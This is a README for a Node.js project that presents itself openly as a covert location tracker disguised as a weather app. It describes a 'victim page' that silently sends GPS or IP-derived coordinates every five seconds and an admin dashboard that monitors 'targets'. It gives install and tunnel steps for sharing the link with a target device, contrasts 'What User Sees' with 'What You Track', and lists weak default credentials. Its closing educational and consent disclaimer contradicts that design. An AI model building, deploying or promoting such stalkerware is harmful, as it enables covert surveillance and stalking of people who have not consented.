# Live Location Tracker

A real-time location tracking application disguised as a premium weather app. Features live GPS tracking, IP geolocation fallback, real-time weather data, and an admin dashboard for monitoring multiple targets simultaneously.

## Features

- **Dual-Layer Geolocation**: GPS + IP geolocation fallback for 100% reliability
- **Real Weather Integration**: Live weather data from Open-Meteo API (no key required)
- **Admin Dashboard**: Real-time target monitoring with socket.io updates
- **Live Map Tracking**: Leaflet-based interactive maps with smooth location updates
- **Automatic Updates**: Location and weather refresh every 5 seconds
- **MaxMind GeoIP**: Local offline database for reliable IP geolocation
- **Cloudflare Tunnel**: Remote access without port forwarding
- **Professional UI**: iOS-style dark theme weather app interface

## Prerequisites

- **Node.js** (v14 or higher)
- **npm** (v6 or higher)
- **Cloudflared** (for remote tunnel access) - [Install here](https://developers.cloudflare.com/cloudflare-one/connections/connect-applications/install-and-setup/installation/)

## Installation

### 1. Clone and Navigate
```bash
git clone https://github.com/abdul12621262-ui/Tracker
cd Tracker-master
```

### 2. Install Dependencies
```bash
npm install
```

### 3. Download GeoIP Database
The application requires MaxMind's GeoLite2 database for offline IP geolocation:

```bash
npm run setup-geoip
```

This command automatically downloads the database to the `geoip/` directory. The database enables location lookups even without internet connectivity to third-party APIs.

### 4. Start the Application
```bash
npm start
```

The server will initialize and output:
- **LOCAL URL** (for testing on same network)
- **REMOTE URL** (via Cloudflare tunnel for sharing)

Both URLs are provided in the terminal output.

## Configuration

Edit `config.js` to customize:

```javascript
const config = {
    port: 6589,           // Server port
    username: "admin",    // Dashboard login username
    password: "admin",    // Dashboard login password
    token: "ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb",
    adminKey: "secret123" // Dashboard access key
}
```

## Usage

### Victim Page (Weather App)
**URL**: `http://localhost:6589/` (or remote URL from terminal)

1. Page auto-requests GPS permission on load
2. User taps "Allow" or denies (IP fallback triggers)
3. Real weather data displays automatically
4. Location updates every 5 seconds silently
5. Appears as normal weather app to user

**What User Sees**:
- Current temperature & conditions
- Hourly forecast
- 10-day forecast
- "Update My Location" button (innocent label)

**What You Track**:
- GPS coordinates (10m accuracy) or
- IP-based location (1km accuracy)
- Every update in real-time

### Admin Dashboard
**URL**: `http://localhost:6589/admin?key=secret123`

Features:
- List of all active targets (connected users)
- Real-time updates via socket.io
- Click any target to open live map
- Shows city/country for each target

### Live Map
**URL**: Accessible from admin dashboard, or directly via:
`http://localhost:6589/map?id=<TARGET_ID>`

Features:
- Real-time target location marker
- Smooth animation on location updates
- Back button to return to dashboard
- "Live Tracking" status indicator

## Architecture

### Backend (Node.js + Express)

**server.js** - Application bootstrap
- Initializes Express + Socket.io server
- Loads MaxMind GeoIP database
- Starts Cloudflare tunnel
- Outputs local and remote URLs

**router.js** - Core API endpoints
- `GET /` - Render weather app (victim page)
- `GET /get-location` - IP geolocation via ipapi.co
- `POST /location` - Receive tracked coordinates
- `GET /get-weather?lat=X&lng=Y` - Real weather data
- `GET /admin?key=secret123` - Admin dashboard
- `GET /map?id=TARGET_ID` - Live map view

**liveweather.js** - Weather API handler
- Fetches data from Open-Meteo (free, no key required)
- Caches results for 10 minutes (rounds coordinates ~1.1km)
- Returns current temp, condition, humidity, wind speed
- Provides 10-day forecast with daily highs/lows
- WMO weather code mapping (sunny, cloudy, rainy, etc.)

**config.js** - Centralized configuration

### Frontend

**weather.html** - Victim tracking page
- Auto-requests GPS permission on page load
- Falls back to IP location if GPS denied/unsupported
- Displays real weather data
- Auto-updates every 5 seconds
- Generates unique tracking ID (localStorage)
- Sends location to `/location` endpoint
- Fetches weather from `/get-weather` endpoint

**home.html** - Admin dashboard
- Lists all active targets
- Real-time updates via socket.io
- Click targets to view live map
- Shows target cities and status

**map.html** - Live tracking map
- Leaflet.js map interface
- Custom pin markers
- Real-time location updates via socket.io
- Shows target ID and live status

**login.html** - Authentication page
- Demo credentials: `admin` / `admin`
- Rarely used (root requires no authentication)

## Geolocation Priority

The application uses a priority-based geolocation strategy:

1. **GPS (Browser)** - ~10m accuracy
   - Requires user permission (auto-requested on page load)
   - Most accurate

2. **MaxMind GeoLite2** - ~1km accuracy
   - Local offline database
   - 100% reliable, no external API calls needed
   - Automatic fallback if GPS unavailable

3. **ipapi.co** - ~1km accuracy
   - Cloud-based IP geolocation
   - Used as secondary fallback
   - Requires internet connectivity

4. **Default Location** - New York (40.7128, -74.0060)
   - Last resort if all methods fail

## Weather Data

The application uses **Open-Meteo API** for weather data:

- **Free**: No API key required
- **Accurate**: Professional meteorological data
- **Sustainable**: Non-profit, open-source service
- **Cached**: 10-minute TTL reduces API calls by 90%+
- **Fast**: ~100-200ms response time

Data provided:
- Current: Temperature, condition, humidity, wind speed
- Forecast: 10-day high/low temperatures and conditions

## Security Notes

- Admin key: Pass via URL parameter `?key=secret123`
- Dashboard login: Uses token-based cookie authentication
- Default credentials: `admin` / `admin` (change in config.js)
- All sensitive data stored server-side
- Socket.io events broadcast only to connected clients

## Remote Access

The app includes Cloudflare Tunnel integration for remote access without port forwarding:

1. Ensure `cloudflared` is installed
2. Run `npm start`
3. Remote URL appears in terminal output
4. Share URL with target device
5. Works from anywhere globally

## Troubleshooting

### GPS Not Requesting Permission
- Ensure page is accessed over HTTPS (or localhost)
- Check browser console for errors
- Verify geolocation is enabled in browser settings

### Weather Data Not Showing
- Check internet connectivity
- Verify coordinates are valid (lat: -90 to 90, lng: -180 to 180)
- Check server logs for API errors

### Socket.io Connection Issues
- Verify server is running (`npm start`)
- Check if admin dashboard is open on same server
- Try clearing browser cache and refresh

### GeoIP Database Not Loading
- Run `npm run setup-geoip` to download database
- Check `geoip/` directory exists
- Verify internet connectivity during setup

## Performance

- **Location Updates**: Every 5 seconds
- **Weather Cache**: 10-minute TTL
- **Database Queries**: <1ms (MaxMind local)
- **API Response**: 100-200ms (Open-Meteo)
- **Socket.io Broadcast**: <50ms to all clients

## Dependencies

- **express** - Web server framework
- **socket.io** - Real-time bidirectional communication
- **maxmind** - GeoIP database reader
- **tarkine** - Tunnel integration
- **leaflet** - Interactive mapping library (CDN)
- **lucide-icons** - Icon set (CDN)

## Educational Use

This application is designed for:
- Understanding real-time location tracking
- Learning geolocation APIs and fallback strategies
- Socket.io implementation
- Full-stack JavaScript development
- API integration patterns

**Note**: Only use for authorized, ethical purposes with explicit user consent.

## License

Educational project for learning purposes.

---

For issues or questions, check the terminal output for detailed logs.
